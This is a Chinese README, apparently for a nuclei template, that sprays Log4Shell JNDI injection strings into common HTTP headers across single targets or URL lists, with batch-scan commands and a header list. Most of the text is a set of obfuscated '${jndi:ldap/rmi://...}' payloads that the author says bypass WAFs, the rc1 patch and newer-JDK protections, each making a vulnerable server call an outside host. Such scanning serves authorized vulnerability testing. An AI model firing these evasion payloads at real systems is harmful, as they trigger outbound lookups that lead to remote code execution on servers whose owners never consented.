# log4j2漏洞快速轻量级检测
针对 log4j来批量fuzz 请求头检测，有效检测一些头部存在的安全风险，nuclei默认使用interactsh的dnslog

为什么用这种，这种方法也是从蜜罐中获取到攻击组织最常用的方法，简单，有效

### v2版本
添加了绕过rc1的poc
也同时能绕过常见主流waf拦截，还有高版本jdk绕过
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
${${lower:jnd}${upper:i}: ${lower:ldap}://interactsh-url}

```


# 使用
```
/nuclei -t log4j-fuzz-head-poc.yaml -u http://www.test.com  -o res.txt  -rl 10 单个检测  速率为10（速率不要太高）

/nuclei -t log4j-fuzz-head-poc.yaml -l urls.txt  -o res.txt   -rl 10   批量检测  速率为10（速率不要太高）
```

![image](https://user-images.githubusercontent.com/50769953/145665694-21632dd2-7336-474b-80ed-9cdba4919898.png)

* X-Client-IP
* X-Remote-IP
* X-Remote-Addr
* X-Forwarded-For
* X-Originating-IP
* User-Agent
* Referer
* CF-Connecting_IP
* True-Client-IP
* X-Forwarded-For
* Originating-IP
* X-Real-IP
* X-Client-IP
* Forwarded
* Client-IP
* Contact
* X-Wap-Profile
* X-Api-Version
